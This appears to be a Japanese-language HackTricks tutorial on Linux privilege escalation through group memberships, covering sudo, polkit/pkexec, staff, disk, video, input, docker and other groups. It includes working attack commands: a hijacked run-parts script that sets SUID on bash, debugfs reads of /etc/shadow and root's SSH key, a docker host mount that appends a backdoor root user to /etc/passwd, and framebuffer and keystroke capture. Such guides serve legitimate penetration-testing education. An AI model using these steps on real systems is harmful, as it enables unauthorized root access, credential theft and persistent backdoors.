# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Adminグループ

### **PE - Method 1**

**場合によっては**、システムの **/etc/sudoers** ポリシー（またはそこからインクルードされるファイル）に、次のようなエントリが含まれています:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

いずれかのエントリに一致するユーザーは、`sudo` を通じて任意の対象ユーザーとして任意のコマンドを実行できることを意味します（ポリシーのその他の条件に従います）。<sup>[[3]](#references)</sup>

この場合、**root になるには、次を実行するだけです**:

```
sudo su
```

`sudo -l` でユーザー名のみを指定する制限付きの `adduser` の実行が許可されている場合、まだ存在しない同名のプライマリグループが作成されるか確認してください。そのグループに属する新規アカウントは、有効な sudoers ポリシーで `%group` に権限が付与されていれば、特権を得る可能性があります。これを権限昇格の経路と見なす前に、グループが作成されることと、そのグループに対するルールの両方を確認してください。アカウントの作成はシステムを変更するため、まずポリシーを確認してください。

### PE - Method 2

すべての suid バイナリを探し、**Pkexec** バイナリがあるか確認してください:

```bash
find / -perm -4000 2>/dev/null
```

**pkexec が SUID binary**の場合、polkit が要求されたアクションを許可した場合に限り、別のユーザーとしてプログラムを実行できます。SUID bit があるだけで root になれるわけではありません。**sudo** または **admin** グループへの所属だけで十分だと決めつけず、インストールされている policy と対象セッションの authorization を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>

別の [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) の経路では、まず `pkexec` が実行可能な **root-owned SUID** file であることを確認してください。その bit がないインストール済み binary は、advisory で説明されているローカル SUID escalation には該当しません。upstream の version string は手がかりにすぎません。ディストリビューションは[古い package version に fix を backport することがある](https://ubuntu.com/security/CVE-2021-4034)ため、脆弱と判断する前に、インストール済みの vendor package と mitigation を確認してください。

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) は別の polkit の経路で、`pkexec` の SUID flaw ではなく、D-Bus authorization race です。インストール済みの vendor polkit package と、アクセス可能な特権 D-Bus action によって有用な変更が可能かを確認してください。アカウント作成の経路には AccountsService のような適切な service も必要です。また、新しいグループの sudo access は、実効的な sudo policy によって決まります。報告された polkit version や service がインストールされていることだけでは、候補にすぎません。特に vendor が[修正を backport している場合](https://access.redhat.com/security/cve/cve-2021-3560)は注意してください。Passive enumeration では race を発生させないでください。

古い Local Authority backend を引き続き使用しているディストリビューションでは、次のコマンドでグループルールを確認してください:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

関連するグループ名とデフォルト設定はディストリビューションによって異なります。この用途でグループが役立つのは、ローカルポリシーでそのグループが指定されている場合のみです。<sup>[[5]](#references)</sup>

**root になるには、次を実行できます**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

**pkexec** の実行を試みて、次の**エラー**が表示された場合:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

登録済みの authentication agent がない SSH セッションでは、ポリシー上は許可される操作でも、`pkexec` がこのエラーで失敗することがあります。polkit は、デスクトップ以外のセッション向けのテキスト認証 agent として `pkttyagent` を案内しています。正確な動作はバージョンやディストリビューションによって異なるため、ローカルのポリシーと agent の設定を確認してください。影響を受ける NixOS のバージョンで報告されている回避策の 1 つは、**2 つの異なる SSH セッション**を使用する方法です。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

あるアカウントの `su` へのアクセスを拒否する ACL が制御するのは、その実行ファイルであり、管理者権限で許可される操作へのあらゆる経路ではありません。管理者の認証情報が別途漏えいした場合は、`systemd-run` による一時的なシステムサービスの起動など、別の操作が実効 polkit ポリシーで許可されているか、認証 agent がどのユーザー ID を受け入れるか、起動されるサービスがどのユーザー ID で実行されるかを確認してください。[Polkit distinguishes authentication as the session owner from an administrator](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)。また、[systemd-run can request a transient service from the system manager](https://systemd.io/CONTROL_GROUP_INTERFACE/)。履歴エントリ、インストール済みコマンド、または読み取り可能なポリシーファイルだけでは、認可や認証情報の有効性は確認できません。受動的な確認では、認証情報を入力したりユニットを起動したりしないでください。

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel グループ

sudoers ポリシーに次のエントリが含まれている場合もあります。

```
%wheel	ALL=(ALL:ALL) ALL
```

これは、このエントリに一致するユーザーは、`sudo`を通じて任意の対象ユーザーとして任意のコマンドを実行できることを意味します（ポリシーの残りの条件に従います）。<sup>[[3]](#references)</sup>

この場合、**rootになるには次を実行するだけです**：

```
sudo su
```

## Shadow グループ

権限が許可されているシステムでは、**shadow** グループのユーザーは **/etc/shadow** を**読み取り**できます。対象システムの実際のモードと ACL を確認してください:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

それでは、ファイルを読み、**いくつかのハッシュをクラックしてみましょう**。

ハッシュをトリアージする際のロック状態に関する補足:
- `!` または `*` が付いたエントリは、通常、パスワードでの非対話型ログインには使用できません。
- `!hash` はパスワードがロックされていたことを示します。残りの文字列は、ロックされる前のパスワードフィールドの内容です。
- `*` を含むフィールドは有効な `crypt(3)` ハッシュではなく、UNIX パスワードでのログインを防ぎます。これを根拠に、以前パスワードが設定されていたかどうかを推測しないでください。
直接ログインがブロックされている場合でも、アカウントの分類に役立ちます。<sup>[[6]](#references)</sup>

## staff グループ

**staff**: root 権限なしで、ユーザーがシステム（`/usr/local`）にローカルな変更を加えられるようにします（`/usr/local/bin` 内の実行ファイルはすべてのユーザーの PATH 変数に含まれており、同名の `/bin` および `/usr/bin` 内の実行ファイルを「上書き」できる点に注意してください）。監視やセキュリティにより関連する「adm」グループと比較してください。<sup>[[2]](#references)[[7]](#references)</sup>

以下の例のように、`/usr/local/bin` が `PATH` 内で `/usr/bin` より先にある Debian の構成では、修飾なしのコマンドは最初に `/usr/local/bin` 内のものとして解決されます。対象システムで有効な `PATH` を確認してください。

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

特権プロセスが書き込み可能な `/usr/local/bin` を通じてパス指定のないコマンドを解決する場合、そのコマンドを置き換えることでプロセスの権限で実行させられる可能性があります。テストする前に、実際のパスと実行のトリガーを確認してください。

Ubuntu システムでは、ログイン時に `pam_motd` が root として `run-parts --lsbsysinit` を使い、実行可能なスクリプトを実行します。cron ジョブでも `run-parts` が使われることがありますが、これはディストリビューションや設定によって異なります。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

新しいSSHログイン時に、`pspy`を使うと、このパスがターゲット上で実際に呼び出されているか確認できます。root権限がなくても、プロセスのコマンドラインを監視できます。<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## ディスクグループ

**disk** グループに所属すると、ブロックデバイスへの raw access が許可される場合があり、**root access に近い権限**を得られることがよくあります。Debian では root とほぼ同等と説明されていますが、対象のデバイス権限とストレージ構成を実際に確認してください。<sup>[[7]](#references)</sup>

一般的なデバイスパスには `/dev/sd*` がありますが、NVMe やその他のストレージ構成では異なる名前が使われます。

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` は ext2/ext3/ext4 ファイルシステム上で動作します。上記の `/root` や `/etc/shadow` などのパスは、開いたファイルシステム内のファイルを指し、`dump` の第2引数はネイティブファイルシステム上の出力先パスです。<sup>[[8]](#references)</sup> たとえば、開いたファイルシステムから `/tmp/asd1.txt` をネイティブファイルシステム上の `/tmp/asd2.txt` に抽出します。

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

`-w` オプションはファイルシステムを読み書き可能な状態で開き、`write` コマンドはネイティブファイルを開いたファイルシステムにコピーします。マウント中の稼働中ファイルシステムでは、直接編集するとファイルシステムが破損するおそれがあるため、使用を避けてください。可能であればオフラインイメージを使って作業してください。<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video グループ

コマンド `w` を使うと、システムに**誰がログインしているか**を確認でき、次のような出力が表示されます。<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** エントリは、Linux の最初の仮想コンソールを示します。ただし、それだけでユーザーが物理的にマシンの前にいることを証明するものではありません。特にコンテナやその他の環境では注意が必要です。<sup>[[21]](#references)</sup>

読み取り可能な framebuffer デバイスを公開しているシステムでは、**video** グループへの所属によって、そのデバイスへのアクセスが許可される場合があります。Linux framebuffer インターフェースのドキュメントでは、`/dev/fb0` は画面スナップショット用にコピーできる読み取り可能なメモリデバイスとして説明されています。`/sys/class/graphics/fb0/virtual_size` パスは、その fbdev sysfs 属性が存在する場合にのみ利用できるため、まず対象環境を確認してください。<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

インストールされている **GIMP** バージョンに raw-data importer がある場合は、それを使って **`screen.raw`** を開きます。対応状況や操作項目は、バージョンやプラグインによって異なります。<sup>[[22]](#references)</sup>

![ディスクグループ - ビデオグループ: raw画像を開くには、GIMPを使い、screen.rawファイルを選択して、ファイルの種類としてRaw image dataを選択します](<../../../images/image (463).png>)

画像の幅と高さをフレームバッファのジオメトリに合わせて設定し、出力が判読できるようになるまで、利用可能なピクセル形式/Image Typesを試します。<sup>[[9]](#references)</sup>

![ディスクグループ - ビデオグループ: 次に、幅と高さを画面で使われている値に変更し、さまざまなImage Typesを試します（画面が最も見やすく表示されるものを選択します）](<../../../images/image (317).png>)

## Inputグループ

`input` グループにキーボードイベントデバイスへの読み取りアクセスを許可するシステムでは、グループメンバーはそのデバイスから生のキーストロークを監視できます。まず、実際のモードとACLを確認してください。アクティブなローカルシートでは、代わりに `uaccess` ACLを通じてアクセス権が付与されることがあり、グループ名だけではアクセスできるとは限りません。<sup>[[23]](#references)[[24]](#references)</sup>

キーボードの `eventX` ハンドラーを見つけ、現在のアカウントにそのノードの読み取り権限があることを確認してから、`evtest` で許可を得た短時間のテストを監視します。`--grab` は使用しないでください。排他的なアクセスを取得し、他のアプリケーションが入力を受け取れなくなることがあります。<sup>[[25]](#references)[[26]](#references)</sup>

```bash
id -nG
cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
getfacl /dev/input/eventX             # Check effective group/seat ACL access
evtest /dev/input/eventX              # Stop with Ctrl-C after the test
```

`EV_KEY` は入力済みテキストではなくキーコードを報告します。値 `1` は押下、`0` は解放、`2` はリピートを表します。これにより、その物理キーボードを使う別のセッションで入力されたキー（認証情報を含む）が漏れる可能性がありますが、それ自体で root access が得られるわけではありません。デスクトップコンポジターを使っても、raw device node へのアクセスは取り消されません。<sup>[[25]](#references)</sup>

より広範な ID とセッションの確認については、[users and sessions](../user-and-session-triage.md) を参照してください。

## Root グループ

**root** グループに所属しても root の UID が得られるわけではありませんが、root が所有するグループ書き込み可能なファイルは、特権サービスやライブラリがそれを使用する場合、調査する価値があります。これを privilege-escalation path と見なす前に、ファイルの実際の権限と用途を確認してください。

**root グループのメンバーが変更できるファイルを確認する**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

`docker` グループに所属すると、標準的な rootful インストールでは Docker daemon に対する root レベルのアクセス権が付与されます。bind mount はデフォルトで読み書き可能なため、この daemon を制御できるユーザーは、ホストの `/` をコンテナにマウントしてホスト上のファイルを変更できます。これにより、実質的にホスト上の root 権限を取得できます。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

グループの所属情報は、`/etc/group`、`/etc/gshadow`、現在のプロセストークン間で一致していない場合があります。`id -nG` にユーザーが表示されないのに `newgrp docker` が成功する場合は、新しいシェルで `id` が示すグループを確認し、Docker socket に実際に書き込み可能か、rootful daemon が稼働しているかをテストしてください。グループ名だけでは、ホストを制御できるとは限りません。自動化された `newgrp` のプローブには制限時間を設け、パスワードプロンプトによって列挙が停止しないようにしてください。

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

最後に、上記の提案が気に入らない場合や、何らかの理由（docker api firewall？）でうまくいかない場合は、こちらで説明されているように、**privileged containerを実行してそこからescapeする**方法もあります。

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

docker socketへの書き込み権限がある場合は、[**docker socketを悪用して権限昇格する方法についてのこの記事**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**を読んでください。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd グループ

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm グループ

通常、**`adm`** グループの**メンバー**には、_/var/log/_ 内のログファイルを**読み取る**権限があります。\
そのため、このグループに属するユーザーを侵害した場合は、必ず**ログを確認**してください。<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail グループ

これらのグループの意味は、サービスやディストリビューションによって異なります。Debianでは、`backup` は委任されたバックアップ／復元、`lp` はプリンターデーモン、`mail` は `/var/mail` に関連付けられているため、グループへの所属を権限昇格の経路と判断する前に、ローカルの権限を確認してください。<sup>[[7]](#references)</sup>

これらは直接root権限を得る経路というより、**認証情報の発見**につながることがよくあります。
- **backup**: 設定ファイル、鍵、DB dump、tokenを含むアーカイブが見つかる可能性があります。
- **operator**: プラットフォーム固有の運用アクセスにより、機密性の高い実行時データがleakする可能性があります。
- **lp**: 印刷キューやスプールに、文書の内容が含まれている可能性があります。
- **mail**: メールスプールから、パスワードリセット用リンク、OTP、内部認証情報が見つかる可能性があります。

このようなグループへの所属は、価値の高いデータ露出の指摘事項として扱い、パスワードやtokenの使い回しを手掛かりに調査を進めてください。

## Auth グループ

OpenBSDでS/Keyが設定されている場合、`/etc/skey` の所有者は `root:auth` であり、その記録へのアクセスには `auth` グループが必要です。YubiKeyの記録は `/var/db/yubikey` に保存されます。<sup>[[16]](#references)[[17]](#references)</sup> S/KeyまたはYubiKeyが有効な脆弱なOpenBSD 6.6の設定では、`auth` 権限を持つローカルユーザーがrootになれる場合がありました。Qualysは前提条件とexploitの手順を説明しており、リンク先のPoCはその手順を実装しています。<sup>[[18]](#references)[[19]](#references)</sup>



## References

- [1] [GUIセッションなしでのpkexec/pkttyagent認証（NixOS issue #18012）](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [システムグループ - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkitリファレンスマニュアル](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkitリファレンスマニュアル](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debianセキュリティマニュアル](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linuxマニュアルページ](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [フレームバッファデバイス — Linuxカーネルドキュメント](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — 権限のないユーザー向けLinuxプロセス監視ツール](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engineのセキュリティ](https://docs.docker.com/engine/security/)
- [14] [root以外のユーザーとしてDockerを管理する](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [コンテナの実行 — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSDマニュアルページ](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSDマニュアルページ](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSDの認証に関する脆弱性 — Qualysセキュリティアドバイザリ](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — ローカルexploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux割り当て済みデバイス（4.x以降のバージョン）](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [画像のインポートとエクスポート — GIMPドキュメント](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
- [23] [beepデバイスの権限に関するガイダンス — Debian Sources](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
- [24] [sd-login — systemdマニュアル](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
- [25] [入力イベントコード — Linuxカーネルドキュメント](https://docs.kernel.org/5.18/input/event-codes.html)
- [26] [evtest(1) — Debian Manpages](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
{{#include ../../../banners/hacktricks-training.md}}
